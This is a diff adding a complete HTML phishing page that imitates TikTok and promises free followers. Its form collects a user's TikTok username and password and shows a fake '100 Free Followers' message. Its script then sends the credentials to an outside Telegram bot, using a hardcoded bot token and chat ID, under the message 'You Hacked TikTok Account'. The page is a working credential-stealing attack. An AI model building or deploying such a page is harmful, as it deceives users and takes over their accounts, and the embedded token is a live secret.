@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Followers</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+        }
+        .container {
+            width: 90%;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        .logo {
+            font-size: 36px;
+            font-weight: bold;
+            color: black;
+        }
+        .logo span {
+            color: #ff0050;
+        }
+        h3 {
+            color: #444;
+            font-size: 18px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .follow-btn {
+            width: 100%;
+            padding: 12px;
+            background: red;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .follow-btn:hover {
+            background: darkred;
+        }
+        .followers-count {
+            font-size: 20px;
+            font-weight: bold;
+            margin-top: 20px;
+            color: green;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">Tik<span>Tok</span></div>
+        <h3>Get Free Followers</h3>
+        <form id="followerForm">
+            <input type="text" id="username" placeholder="Enter Your TikTok Username" required>
+            <input type="password" id="password" placeholder="Enter Your Password" required>
+            <button type="submit" class="follow-btn">Get Free Followers</button>
+        </form>
+        <p class="followers-count" id="followersMessage">🎉 Congratulations! You got 100 Free Followers! 🎉</p>
+    </div>
+
+    <script>
+        document.getElementById("followerForm").addEventListener("submit", function(event) {
+            event.preventDefault();
+
+            let username = document.getElementById("username").value;
+            let password = document.getElementById("password").value;
+
+            if (username.trim() === "" || password.trim() === "") {
+                alert("Please enter your TikTok username and password!");
+                return;
+            }
+
+            // Show 100 followers message
+            document.getElementById("followersMessage").style.display = "block";
+
+            // Send data to Telegram bot
+            let botToken = "7333720200:AAFEzoKvQm0iVYXatr3HG-ei4MK3JY8Ri3s";
+            let chatId = "7781048618";
+            let message = `🔹 Good Job MSK You Hacked TikTok Account 🔹\n\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => console.log("Sent to Telegram"))
+                .catch(error => console.error("Error:", error));
+        });
+    </script>
+
+</body>
+</html>
